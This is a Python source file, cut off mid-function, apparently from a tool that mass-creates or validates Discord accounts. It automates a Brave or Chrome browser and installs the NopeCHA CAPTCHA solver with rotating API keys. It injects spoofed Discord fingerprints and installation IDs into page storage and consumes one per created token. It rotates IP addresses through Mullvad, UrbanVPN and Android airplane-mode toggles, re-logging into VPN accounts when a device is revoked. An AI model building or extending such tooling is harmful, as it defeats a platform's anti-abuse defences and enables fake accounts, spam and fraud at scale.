import asyncio
from datetime import datetime
import hashlib
import os
import shutil
from pathlib import Path
import platform
import re
import sys
import threading
import time
import json
import random
import string
import signal
import tempfile
from typing import Optional, Dict
import requests
import httpx
import tls_client
from colorama import Fore, Style, init
from pystyle import Center
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.table import Table
from rich.text import Text
from collections import deque
import warnings
import nodriver as uc
from nodriver import cdp
import urllib3
import base64
import logging
import imaplib
import email as email_module
from email.header import decode_header
import psutil

# ===== SILENCE UGLY SSL WARNINGS =====
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

# ============================================================================
# CDP KEY SENDER
# ============================================================================

async def _cdp_key(tab, key: str, code: str, keycode: int):
    try:
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyDown", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
        await asyncio.sleep(0.05)
        await tab.send(
            cdp.input_.dispatch_key_event(
                type_="keyUp", key=key, code=code,
                windows_virtual_key_code=keycode,
                native_virtual_key_code=keycode,
            )
        )
    except Exception:
        pass

# ============================================================================
# BRAVE BROWSER PATH
# ============================================================================

def get_brave_path() -> Optional[str]:
    paths = [
        r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
        r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\Application\brave.exe"),
        "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser",
        "/usr/bin/brave-browser",
        "/usr/bin/brave",
        "/snap/bin/brave",
    ]
    for p in paths:
        if os.path.exists(p):
            return p
    return None

BRAVE_PATH = get_brave_path()

if BRAVE_PATH:
    pass
else:
    print("\033[93m[WARN]\033[0m Brave not found — falling back to default Chrome")

# ============================================================================
# NOPECHA AUTO-INSTALLER
# ============================================================================

NOPECHA_EXT_DIR = Path(__file__).parent / "nopecha_ext"
NOPECHA_KEYS_FILE = Path(__file__).parent / "nopecha_keys.txt"
NOPECHA_KEY_INDEX = 0
NOPECHA_KEY_LOCK = threading.Lock()

def load_nopecha_keys() -> list:
    if not NOPECHA_KEYS_FILE.exists():
        NOPECHA_KEYS_FILE.write_text(
            "# Add your NopeCHA API keys here, one per line\n"
            "# Get keys from https://nopecha.com/setup\n"
        )
        return []
    keys = []
    for line in NOPECHA_KEYS_FILE.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            keys.append(line)
    return keys

def get_current_nopecha_key() -> Optional[str]:
    # First, try to get key from config.json
    try:
        if isinstance(config, dict):
            nopecha_config = config.get("nopecha", {})
            if nopecha_config.get("enabled", False) and nopecha_config.get("api_key"):
                key = nopecha_config.get("api_key")
                if key and key != "YOUR_NOPECHA_API_KEY_HERE":
                    return key
    except Exception:
        pass
    
    # Fall back to nopecha_keys.txt
    keys = load_nopecha_keys()
    if not keys:
        return None
    with NOPECHA_KEY_LOCK:
        return keys[NOPECHA_KEY_INDEX % len(keys)]

def rotate_nopecha_key():
    global NOPECHA_KEY_INDEX
    keys = load_nopecha_keys()
    if keys:
        with NOPECHA_KEY_LOCK:
            NOPECHA_KEY_INDEX = (NOPECHA_KEY_INDEX + 1) % len(keys)
        # Rotated NopeCHA key

def inject_nopecha_key(api_key: str) -> bool:
    if not api_key or not NOPECHA_EXT_DIR.exists():
        return False
    
    try:
        # Method 1: Add to manifest.json
        manifest_path = NOPECHA_EXT_DIR / "manifest.json"
        if manifest_path.exists():
            with open(manifest_path, 'r') as f:
                manifest = json.load(f)
            if 'nopecha' not in manifest:
                manifest['nopecha'] = {}
            manifest['nopecha']['key'] = api_key
            with open(manifest_path, 'w') as f:
                json.dump(manifest, f, indent=2)
        
        # Method 2: Create a storage initialization script
        storage_init_path = NOPECHA_EXT_DIR / "storage_init.js"
        storage_init_code = f"""
// Auto-generated storage initialization for NopeCHA extension
(function() {{
  const nopecha_api_key = '{api_key}';
  chrome.storage.local.set({{'nopecha_key': nopecha_api_key}}, function() {{
    console.log('[NopeCHA Storage] API Key initialized');
  }});
}})();
"""
        with open(storage_init_path, 'w') as f:
            f.write(storage_init_code)
        
        # Method 3: Create nopecha_config.json file
        config_path = NOPECHA_EXT_DIR / "nopecha_config.json"
        config_data = {
            'api_key': api_key,
            'enabled': True,
            'timestamp': datetime.now().isoformat()
        }
        with open(config_path, 'w') as f:
            json.dump(config_data, f, indent=2)
        
        return True
    except Exception as e:
        log.warning(f"Inject failed: {e}")
        return False

def download_nopecha_ext() -> Optional[Path]:
    if NOPECHA_EXT_DIR.exists() and (NOPECHA_EXT_DIR / "manifest.json").exists():
        return NOPECHA_EXT_DIR
    import zipfile, io
    # Downloading NopeCHA extension
    zip_url = "https://github.com/NopeCHALLC/nopecha-extension/releases/latest/download/chromium_automation.zip"
    try:
        r = requests.get(zip_url, timeout=60, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code != 200:
            log.warning(f"NopeCHA download failed: HTTP {r.status_code}")
            return None
        NOPECHA_EXT_DIR.mkdir(exist_ok=True)
        with zipfile.ZipFile(io.BytesIO(r.content)) as z:
            z.extractall(NOPECHA_EXT_DIR)
        log.success("NopeCHA extension downloaded!")
        return NOPECHA_EXT_DIR
    except Exception as e:
        log.warning(f"NopeCHA download error: {e}")
        return None

# ============================================================================
# FINGERPRINTS HANDLER
# ============================================================================

FINGERPRINTS_FILE = Path(__file__).parent / "input/fingerprints.txt"
FINGERPRINTS_INDEX = 0
FINGERPRINTS_LOCK = threading.Lock()
RESERVED_FINGERPRINTS = set()

def load_fingerprints() -> list:
    """Load fingerprints from fingerprints.txt file"""
    if not FINGERPRINTS_FILE.exists():
        FINGERPRINTS_FILE.write_text(
            "# Add your fingerprints here, one per line\n"
            "# Each fingerprint will be assigned to one account\n"
        )
        return []
    fingerprints = []
    for line in FINGERPRINTS_FILE.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            fingerprints.append(line)
    return fingerprints

def parse_fingerprint_line(line: str) -> Dict:
    """Parse a fingerprint line as raw fingerprint or JSON object."""
    if not line:
        return {}
    line = line.strip()
    if not line:
        return {}
    try:
        data = json.loads(line)
        if isinstance(data, dict):
            fingerprint = data.get('fingerprint') or data.get('metadata', {}).get('fingerprint')
            if fingerprint:
                data['fingerprint'] = fingerprint
            return data
    except json.JSONDecodeError:
        pass
    return {
        'fingerprint': line,
        'metadata': {
            'fingerprint': line
        }
    }


def get_fingerprint_value(fingerprint_line: str) -> Optional[str]:
    data = parse_fingerprint_line(fingerprint_line)
    return data.get('fingerprint')


def get_fingerprint_installation_id(fingerprint_line: str) -> Optional[str]:
    data = parse_fingerprint_line(fingerprint_line)
    installation = data.get('installation') or data.get('metadata', {}).get('installation')
    return installation


def get_current_fingerprint() -> Optional[str]:
    """Get current fingerprint for account"""
    fingerprints = load_fingerprints()
    if not fingerprints:
        return None
    with FINGERPRINTS_LOCK:
        return fingerprints[FINGERPRINTS_INDEX % len(fingerprints)]

def reserve_fingerprint() -> Optional[str]:
    """Reserve a fingerprint for a worker so it is unique in-memory."""
    with FINGERPRINTS_LOCK:
        fingerprints = [f for f in load_fingerprints() if f not in RESERVED_FINGERPRINTS]
        if not fingerprints:
            return None
        fingerprint = fingerprints[0]
        RESERVED_FINGERPRINTS.add(fingerprint)
        return fingerprint

def release_fingerprint(fingerprint: str):
    """Release a reserved fingerprint when token creation fails."""
    if not fingerprint:
        return
    with FINGERPRINTS_LOCK:
        RESERVED_FINGERPRINTS.discard(fingerprint)

def consume_fingerprint(fingerprint: str):
    """Remove a successfully used fingerprint from the file and release its reservation."""
    if not fingerprint:
        return
    with FINGERPRINTS_LOCK:
        lines = []
        for line in FINGERPRINTS_FILE.read_text().splitlines():
            stripped = line.strip()
            if stripped and not stripped.startswith('#') and stripped != fingerprint:
                lines.append(line)
        FINGERPRINTS_FILE.write_text("\n".join(lines) + ("\n" if lines else ""))
        RESERVED_FINGERPRINTS.discard(fingerprint)

def rotate_fingerprint():
    """Rotate to next fingerprint"""
    global FINGERPRINTS_INDEX
    fingerprints = load_fingerprints()
    if fingerprints:
        with FINGERPRINTS_LOCK:
            FINGERPRINTS_INDEX = (FINGERPRINTS_INDEX + 1) % len(fingerprints)

def get_fingerprint_installation_number(fingerprint: str) -> Optional[int]:
    """Return the 1-based installation number for a fingerprint."""
    if not fingerprint:
        return None
    fingerprints = load_fingerprints()
    for idx, fp in enumerate(fingerprints, start=1):
        if fp == fingerprint:
            return idx
    return None


async def inject_fingerprint_to_page(page, fingerprint_line: str) -> bool:
    """Inject fingerprint metadata into the browser page storage."""
    data = parse_fingerprint_line(fingerprint_line)
    fingerprint_value = data.get('fingerprint')
    if not fingerprint_value:
        return False
    installation_value = data.get('installation') or data.get('metadata', {}).get('installation')
    json_data = json.dumps(data)
    js = f'''
    (() => {{
        try {{
            window.__discord_fp_data = {json_data};
            window.localStorage.setItem('discord_fp_data', JSON.stringify({json_data}));
            window.localStorage.setItem('discord_fingerprint', {json.dumps(fingerprint_value)});
            if ({json.dumps(bool(installation_value))}) {{
                window.localStorage.setItem('discord_installation_id', {json.dumps(installation_value)});
            }}
            return true;
        }} catch (e) {{
            return false;
        }}
    }})();
    '''
    try:
        return await page.evaluate(js)
    except Exception:
        return False

# ============================================================================
# MULLVAD VPN HANDLER
# ============================================================================

import subprocess
import psutil

# Mullvad rotation stats
MULLVAD_STATS = {
    'total_rotations': 0,
    'failed_rotations': 0,
    'ip_changes': 0,
    'last_ip': None,
    'last_rotation_time': None,
}

# UrbanVPN rotation stats
URBANVPN_STATS = {
    'total_rotations': 0,
    'failed_rotations': 0,
    'last_ip': None,
    'last_rotation_time': None,
}

URBANVPN_BINARY = 'urbanvpn'
URBANVPN_AVAILABLE = False

# Account validation stats
ACCOUNT_STATS = {
    'valid': 0,
    'invalid': 0,
    'locked': 0,
    'verified': 0,
    'captcha_ok': 0,
    'captcha_fail': 0,
    'phone': 0,
}
ACCOUNT_STATS_LOCK = threading.Lock()

# Network traffic stats
NETWORK_STATS = {
    'last_bytes_sent': 0,
    'last_bytes_recv': 0,
    'last_check_time': time.time(),
    'upload_mbps': 0.0,
    'download_mbps': 0.0,
}
NETWORK_STATS_LOCK = threading.Lock()

def get_network_stats() -> dict:
    """Get current network upload/download speed in Mbps"""
    try:
        with NETWORK_STATS_LOCK:
            current_time = time.time()
            net_io = psutil.net_io_counters()
            time_diff = max(current_time - NETWORK_STATS['last_check_time'], 0.1)
            
            # Calculate bytes per second then convert to Mbps
            bytes_sent_diff = max(net_io.bytes_sent - NETWORK_STATS['last_bytes_sent'], 0)
            bytes_recv_diff = max(net_io.bytes_recv - NETWORK_STATS['last_bytes_recv'], 0)
            
            upload_mbps = (bytes_sent_diff / time_diff) * 8 / 1_000_000  # Convert to Mbps
            download_mbps = (bytes_recv_diff / time_diff) * 8 / 1_000_000
            
            NETWORK_STATS['last_bytes_sent'] = net_io.bytes_sent
            NETWORK_STATS['last_bytes_recv'] = net_io.bytes_recv
            NETWORK_STATS['last_check_time'] = current_time
            NETWORK_STATS['upload_mbps'] = upload_mbps
            NETWORK_STATS['download_mbps'] = download_mbps
            
            return NETWORK_STATS.copy()
    except Exception:
        return NETWORK_STATS.copy()

def check_mullvad_installed() -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'version'],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False

def mullvad_kill_stuck_process(timeout: int = 30):
    """Kill stuck mullvad processes if they exceed timeout"""
    try:
        for proc in psutil.process_iter(['pid', 'name', 'create_time']):
            try:
                if 'mullvad' in proc.info['name'].lower():
                    runtime = time.time() - proc.info['create_time']
                    if runtime > timeout:
                        proc.kill()
                        log.warning(f"Killed stuck mullvad process (PID: {proc.pid})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception:
        pass

def mullvad_status(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            ['mullvad', 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        status = result.stdout.strip()
        status = re.sub(r'Visible location:[^\r\n]*', '', status, flags=re.IGNORECASE)
        status = re.sub(r'IPv4:[^\r\n]*', '', status, flags=re.IGNORECASE)
        status = re.sub(r'\s{2,}', ' ', status).strip()
        return status
    except subprocess.TimeoutExpired:
        log.warning("mullvad status command timed out")
        mullvad_kill_stuck_process()
        return "timeout"
    except Exception:
        return "unknown"

def mullvad_disconnect(timeout: int = 15, max_attempts: int = 15):
    """Disconnect with improved timeout and verification"""
    try:
        subprocess.run(
            ['mullvad', 'disconnect'],
            capture_output=True, text=True, timeout=10
        )
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = mullvad_status(timeout=5)
            if "Disconnected" in status:
                # Silent on success
                return
            time.sleep(0.5)
            attempts += 1
        
        if attempts >= max_attempts:
            log.warning(f"Disconnect verification timed out after {attempts} attempts")
    except Exception as e:
        log.warning(f"Mullvad disconnect error: {e}")
        mullvad_kill_stuck_process()

def mullvad_connect(country: str = "us", timeout: int = 30, max_attempts: int = 30) -> bool:
    """Connect with improved error handling and verification"""
    try:
        # Set location
        result = subprocess.run(
            ['mullvad', 'relay', 'set', 'location', country],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log.warning(f"Failed to set Mullvad location to {country}")
            return False

        # Set tunnel protocol
        subprocess.run(
            ['mullvad', 'relay', 'set', 'tunnel-protocol', 'wireguard'],
            capture_output=True, text=True, timeout=10
        )

        # Connect
        subprocess.run(
            ['mullvad', 'connect'],
            capture_output=True, text=True, timeout=10
        )

        # Wait for connection with adaptive polling
        start_time = time.time()
        attempts = 0
        
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = mullvad_status(timeout=5)
            
            if "Connected" in status:
                # Silent on success
                return True
            
            if "Connecting" in status or "Connecting" in status:
                # Adaptive wait - shorter at first, longer later
                wait_time = 0.5 if attempts < 5 else 1.0
                time.sleep(wait_time)
            else:
                log.debug(f"Mullvad status: {status}")
                time.sleep(1)
            
            attempts += 1
        
        # Final status check
        final_status = mullvad_status(timeout=5)
        log.error(f"Mullvad connection timeout. Final status: {final_status}")
        return False
        
    except subprocess.TimeoutExpired as e:
        log.error(f"Mullvad command timed out: {e}")
        mullvad_kill_stuck_process()
        return False
    except Exception as e:
        log.error(f"Mullvad connect error: {e}")
        return False

def mullvad_get_ip(timeout: int = 15, attempts: int = 3) -> Optional[str]:
    """Get IP with retries and fallback providers"""
    providers = [
        ('https://am.i.mullvad.net/json', 'ip'),
        ('https://api.ipify.org?format=json', 'ip'),
        ('https://ifconfig.me/all.json', 'ip_addr'),
    ]
    
    for attempt in range(attempts):
        for url, key in providers:
            try:
                resp = requests.get(url, timeout=timeout)
                if resp.status_code == 200:
                    data = resp.json()
                    ip = data.get(key, data.get('ip', None))
                    if ip:
                        return ip
            except Exception:
                continue
        
        if attempt < attempts - 1:
            time.sleep(1)
    
    return None


def load_mullvad_accounts() -> list:
    account_file = config.get("mullvad", {}).get("account_file", "input/mullvad_accounts.txt")
    account_path = Path(account_file)
    if not account_path.is_absolute():
        account_path = Path(__file__).parent / account_path

    if not account_path.exists():
        account_path.parent.mkdir(parents=True, exist_ok=True)
        account_path.write_text(
            "# Add your Mullvad account numbers here, one per line\n"
            "# The most recent account should be last\n"
        )
        return []

    accounts = []
    for line in account_path.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#'):
            accounts.append(line)
    return accounts


def get_recent_mullvad_account() -> Optional[str]:
    account_number = config.get("mullvad", {}).get("account_number", "")
    if isinstance(account_number, str) and account_number.strip():
        return account_number.strip()

    accounts = load_mullvad_accounts()
    if not accounts:
        return None
    return accounts[-1]


def mullvad_account_status(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            ['mullvad', 'account', 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        if result.returncode != 0:
            return (result.stderr or result.stdout or '').strip()
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        return "timeout"
    except Exception:
        return ""


def is_mullvad_device_revoked(status: str) -> bool:
    if not status:
        return False
    lowered = status.lower()
    revoked_keywords = ['revoked', 'revocation', 'expired', 'inactive', 'deactivated', 'invalid device', 'device revoked', 'device disabled']
    return any(keyword in lowered for keyword in revoked_keywords)


def mullvad_account_login(account: str, timeout: int = 30) -> bool:
    try:
        result = subprocess.run(
            ['mullvad', 'account', 'login', account],
            capture_output=True, text=True, timeout=timeout
        )
        if result.returncode == 0:
            return True
        return False
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False


def mullvad_auto_login_recent_account() -> bool:
    account = get_recent_mullvad_account()
    if not account:
        log.warning("No Mullvad account configured for auto-login")
        return True

    status = mullvad_account_status()
    if is_mullvad_device_revoked(status):
        log.warning("Mullvad device has been revoked; attempting auto-login...")
        if mullvad_account_login(account):
            # Silent on auto-login success
            return True
        else:
            log.error("Mullvad auto-login failed after device revocation")
            return False

    # Device not revoked, no auto-login needed
    return True


def mullvad_rotate(country: str = "us", max_retries: int = 3, min_rotation_delay: int = 2) -> bool:
    """Rotate VPN with IP verification and retry logic"""
    MULLVAD_STATS['total_rotations'] += 1
    
    # Enforce minimum delay between rotations
    if MULLVAD_STATS['last_rotation_time']:
        elapsed = time.time() - MULLVAD_STATS['last_rotation_time']
        if elapsed < min_rotation_delay:
            time.sleep(min_rotation_delay - elapsed)
    
    old_ip = MULLVAD_STATS['last_ip']
    
    for attempt in range(max_retries):
        try:
            # Disconnect
            mullvad_disconnect(timeout=15)
            time.sleep(1)
            
            # Connect
            if not mullvad_connect(country, timeout=30):
                if config.get("mullvad", {}).get("auto_login", False):
                    status = mullvad_account_status()
                    if is_mullvad_device_revoked(status):
                        log.warning("Detected revoked Mullvad device during rotation; attempting auto-login...")
                        if mullvad_auto_login_recent_account():
                            time.sleep(1)
                            continue
                        else:
                            log.error("Mullvad auto-login failed after revoked device detection")
                            MULLVAD_STATS['failed_rotations'] += 1
                            return False

                if attempt < max_retries - 1:
                    log.warning(f"Rotation attempt {attempt + 1}/{max_retries} failed, retrying...")
                    time.sleep(2 ** attempt)  # Exponential backoff
                    continue
                else:
                    log.error("Mullvad rotation failed after all retries")
                    MULLVAD_STATS['failed_rotations'] += 1
                    return False
            
            # Verify IP change
            time.sleep(1)
            new_ip = mullvad_get_ip(timeout=15)
            
            if new_ip:
                MULLVAD_STATS['last_ip'] = new_ip
                MULLVAD_STATS['last_rotation_time'] = time.time()
                
                if old_ip and new_ip == old_ip:
                    log.warning(f"IP did not change: {log.mask_ip(new_ip)} (retry {attempt + 1}/{max_retries})")
                    if attempt < max_retries - 1:
                        time.sleep(2 ** attempt)
                        mullvad_disconnect()
                        continue
                    else:
                        MULLVAD_STATS['failed_rotations'] += 1
                        return False
                else:
                    # Log successful rotation in white
                    if old_ip and new_ip != old_ip:
                        log.white(f"IP rotated: {log.mask_ip(old_ip)} → {log.mask_ip(new_ip)}")
                    else:
                        log.white(f"IP: {log.mask_ip(new_ip)}")
                    MULLVAD_STATS['ip_changes'] += 1
                    return True
            else:
                log.warning(f"Could not verify IP (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                else:
                    MULLVAD_STATS['failed_rotations'] += 1
                    return False
        
        except Exception as e:
            log.error(f"Rotation error: {e}")
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
            else:
                MULLVAD_STATS['failed_rotations'] += 1
                return False
    
    return False

# UrbanVPN CLI support

def find_urbanvpn_binary() -> Optional[str]:
    """Find UrbanVPN CLI binary in PATH, config, or common locations."""
    try:
        urbanvpn_config = config.get('urbanvpn', {})
        urbanvpn_path = urbanvpn_config.get('path')
        if urbanvpn_path:
            if os.path.isfile(urbanvpn_path):
                return urbanvpn_path
            if os.path.isdir(urbanvpn_path):
                candidates = ['urbanvpn.exe', 'urban-vpn.exe', 'urbanvpn-cli.exe', 'urbanvpn', 'urban-vpn', 'urbanvpn-cli']
                for candidate in candidates:
                    candidate_path = os.path.join(urbanvpn_path, candidate)
                    if os.path.isfile(candidate_path):
                        return candidate_path
                # also search common bin subfolder
                bin_dir = os.path.join(urbanvpn_path, 'bin')
                if os.path.isdir(bin_dir):
                    for candidate in candidates:
                        candidate_path = os.path.join(bin_dir, candidate)
                        if os.path.isfile(candidate_path):
                            return candidate_path
    except Exception:
        pass

    for candidate in ['urbanvpn', 'urban-vpn', 'urbanvpn-cli']:
        try:
            which = shutil.which(candidate)
            if which:
                return which
        except Exception:
            pass

    return None


def check_urbanvpn_installed() -> bool:
    try:
        global URBANVPN_BINARY
        found = find_urbanvpn_binary()
        if not found:
            return False
        URBANVPN_BINARY = found
        result = subprocess.run(
            [URBANVPN_BINARY, 'version'],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False
    except Exception:
        return False


def urbanvpn_status(timeout: int = 10) -> str:
    try:
        result = subprocess.run(
            [URBANVPN_BINARY, 'status'],
            capture_output=True, text=True, timeout=timeout
        )
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        log.warning('UrbanVPN status command timed out')
        return 'timeout'
    except Exception:
        return 'unknown'


def urbanvpn_disconnect(timeout: int = 15, max_attempts: int = 15) -> bool:
    try:
        subprocess.run(
            [URBANVPN_BINARY, 'disconnect'],
            capture_output=True, text=True, timeout=10
        )
        start_time = time.time()
        attempts = 0
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = urbanvpn_status(timeout=5)
            if 'Disconnected' in status or 'disconnected' in status:
                log.info('UrbanVPN disconnected successfully')
                return True
            time.sleep(0.5)
            attempts += 1
        if attempts >= max_attempts:
            log.warning(f'UrbanVPN disconnect verification timed out after {attempts} attempts')
        return False
    except Exception as e:
        log.warning(f'UrbanVPN disconnect error: {e}')
        return False


def urbanvpn_connect(server: str = 'us', timeout: int = 30, max_attempts: int = 30) -> bool:
    try:
        # Try the most common UrbanVPN CLI connect syntax, with fallback to explicit server flag
        connect_cmds = [
            [URBANVPN_BINARY, 'connect', server],
            [URBANVPN_BINARY, 'connect', '--server', server],
            [URBANVPN_BINARY, 'connect', '--country', server],
        ]
        for cmd in connect_cmds:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            if result.returncode == 0:
                break
        else:
            log.warning(f'UrbanVPN failed to connect with server {server}')
            return False

        start_time = time.time()
        attempts = 0
        while time.time() - start_time < timeout and attempts < max_attempts:
            status = urbanvpn_status(timeout=5)
            if 'Connected' in status or 'connected' in status:
                log.success(f'UrbanVPN connected to {server}')
                return True
            time.sleep(1)
            attempts += 1
        final_status = urbanvpn_status(timeout=5)
        log.warning(f'UrbanVPN connect timeout. Final status: {final_status}')
        return False
    except subprocess.TimeoutExpired as e:
        log.warning(f'UrbanVPN command timed out: {e}')
        return False
    except Exception as e:
        log.warning(f'UrbanVPN connect error: {e}')
        return False


def urbanvpn_rotate(server: str = 'us', max_retries: int = 3, min_rotation_delay: int = 2) -> bool:
    URBANVPN_STATS['total_rotations'] += 1
    if URBANVPN_STATS['last_rotation_time']:
        elapsed = time.time() - URBANVPN_STATS['last_rotation_time']
        if elapsed < min_rotation_delay:
            time.sleep(min_rotation_delay - elapsed)
    old_ip = URBANVPN_STATS['last_ip']
    for attempt in range(max_retries):
        if not urbanvpn_disconnect():
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)
                continue
            URBANVPN_STATS['failed_rotations'] += 1
            return False
        time.sleep(1)
        if not urbanvpn_connect(server, timeout=30):
            if attempt < max_retries - 1:
                log.warning(f'UrbanVPN rotation attempt {attempt + 1}/{max_retries} failed, retrying...')
                time.sleep(2 ** attempt)
                continue
            URBANVPN_STATS['failed_rotations'] += 1
            return False
        time.sleep(2)
        new_ip = get_public_ip()
        if new_ip:
            URBANVPN_STATS['last_ip'] = new_ip
            URBANVPN_STATS['last_rotation_time'] = time.time()
            if old_ip and new_ip == old_ip:
                log.warning(f'UrbanVPN IP did not change: {log.mask_ip(new_ip)} (retry {attempt + 1}/{max_retries})')
                if attempt < max_retries - 1:
                    time.sleep(2 ** attempt)
                    continue
                URBANVPN_STATS['failed_rotations'] += 1
                return False
            else:
                if old_ip:
                    log.success(f'UrbanVPN IP rotated: {log.mask_ip(old_ip)} → {log.mask_ip(new_ip)}')
                else:
                    log.success(f'UrbanVPN connected — IP: {log.mask_ip(new_ip)}')
                return True
        else:
            log.warning(f'UrbanVPN could not verify IP (attempt {attempt + 1}/{max_retries})')
            if attempt < max_retries - 1:
                continue
            URBANVPN_STATS['failed_rotations'] += 1
            return False
    return False

MULLVAD_AVAILABLE = False

def get_mullvad_stats() -> dict:
    """Get Mullvad rotation statistics"""
    stats = MULLVAD_STATS.copy()
    if stats['total_rotations'] > 0:
        stats['success_rate'] = f"{((stats['total_rotations'] - stats['failed_rotations']) / stats['total_rotations'] * 100):.1f}%"
    return stats

def get_account_stats() -> dict:
    """Get account validation statistics"""
    with ACCOUNT_STATS_LOCK:
        stats = ACCOUNT_STATS.copy()
    total = stats['valid'] + stats['invalid'] + stats['locked']
    if total > 0:
        stats['valid_percent'] = f"{(stats['valid'] / total * 100):.1f}%"
        stats['total'] = total
    else:
        stats['valid_percent'] = "0.0%"
        stats['total'] = 0
    return stats

# ============================================================================
# ADB (ANDROID DEBUG BRIDGE) HANDLER
# ============================================================================

ADB_ENABLED = False
ADB_DEVICE = None
ADB_BINARY = 'adb'
ADB_LAST_IP = None
ADB_HOST = None
ADB_PORT = None

def get_public_ip(timeout: int = 8) -> Optional[str]:
    """Return current public IP using external service or None"""
    try:
        resp = requests.get('https://api.ipify.org?format=text', timeout=timeout)
        if resp.status_code == 200:
            ip = resp.text.strip()
            # basic validation
            if re.match(r"^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", ip):
                return ip
            return ip
    except Exception:
        return None
    return None

def find_adb_binary() -> Optional[str]:
    """Find adb binary in PATH, config or common emulator install locations"""
    # Prefer configured path
    try:
        adb_config = config.get('adb', {})
        adb_path = adb_config.get('path')
        if adb_path and os.path.exists(adb_path):
            return adb_path
    except Exception:
        pass

    # Prefer adb from PATH
    try:
        which = shutil.which('adb')
        if which:
            return which
    except Exception:
        pass

    # Common LDPlayer locations
    candidates = [
        r"C:\LDPlayer\LDPlayer9\adb.exe",
        r"C:\LDPlayer\LDPlayer4\adb.exe",
        r"C:\Program Files\LDPlayer\adb.exe",
        r"C:\Program Files\ldplayer\adb.exe",
        r"C:\Program Files\ldplayer9\adb.exe",
        r"C:\Program Files (x86)\ldplayer\adb.exe",
    ]
    for p in candidates:
        if os.path.exists(p):
            return p
    return None

def adb_connect_remote(host: str, port: int) -> Optional[str]:
    """Connect to remote ADB host and return the output"""
    try:
        proc = subprocess.run(
            [ADB_BINARY, 'connect', f"{host}:{port}"],
            capture_output=True, text=True, timeout=15
        )
        output = proc.stdout.strip() or proc.stderr.strip()
        return output
    except Exception:
        return None


def check_adb_installed() -> bool:
    """Check if ADB is installed and available"""
    try:
        global ADB_BINARY
        found = find_adb_binary()
        if not found:
            return False
        ADB_BINARY = found
        result = subprocess.run(
            [ADB_BINARY, 'version'],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode == 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def get_adb_device() -> Optional[str]:
    """Get connected ADB device ID"""
    try:
        global ADB_BINARY
        result = subprocess.run(
            [ADB_BINARY, 'devices'],
            capture_output=True, text=True, timeout=10
        )
        lines = result.stdout.strip().split('\n')
        for line in lines:
            if 'device' in line.lower() and not line.startswith('List') and not line.strip().endswith('unauthorized'):
                device_id = line.split()[0]
                if device_id:
                    return device_id
        return None
    except Exception:
        return None

def adb_shell_command(command: str, device: str = None) -> Optional[str]:
    """Execute a shell command on Android device via ADB"""
    try:
        global ADB_BINARY
        cmd = f'"{ADB_BINARY}"'
        if device:
            cmd += f' -s {device}'
        cmd += f' shell {command}'
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=45)
        return result.stdout.strip() if result.returncode == 0 else None
    except subprocess.TimeoutExpired:
        log.warning(f"ADB command timed out: {command}")
        return None
    except Exception as e:
        log.warning(f"ADB shell error: {e}")
        return None


def adb_get_public_ip(device: str = None, timeout: int = 15) -> Optional[str]:
    """Get public IP from the Android device using available shell tools."""
    device = device or ADB_DEVICE
    if not device:
        return None

    for cmd in [
        'curl -s https://api.ipify.org',
        'wget -qO- https://api.ipify.org',
        'busybox wget -qO- https://api.ipify.org',
        'toybox wget -qO- https://api.ipify.org',
    ]:
        result = adb_shell_command(cmd, device)
        if result and re.match(r"^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$", result.strip()):
            return result.strip()
    return None


def adb_change_ip(device: str = None, vpn_profile: str = None, wait_time: int = 5) -> bool:
    """Change IP on Android device via ADB"""
    device = device or ADB_DEVICE
    if not device:
        log.warning("No ADB device found")
        return False

    ip_before = adb_get_public_ip(device)
    if not ip_before:
        log.warning("ADB: Could not fetch IP before rotation")
        return False

    log.info(f"ADB: Current IP: {ip_before}")
    
    log.info("ADB: Attempting airplane-mode toggle...")
    adb_shell_command('settings put global airplane_mode_on 1 && am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true', device)
    time.sleep(8)
    adb_shell_command('settings put global airplane_mode_on 0 && am broadcast -a android.intent.action.AIRPLANE_MODE --ez state false', device)
    
    log.info("ADB: Waiting for network reconnection...")
    time.sleep(wait_time + 3)
    
    ip_after = adb_get_public_ip(device)
    if not ip_after:
        log.warning("ADB: Could not fetch IP after rotation")
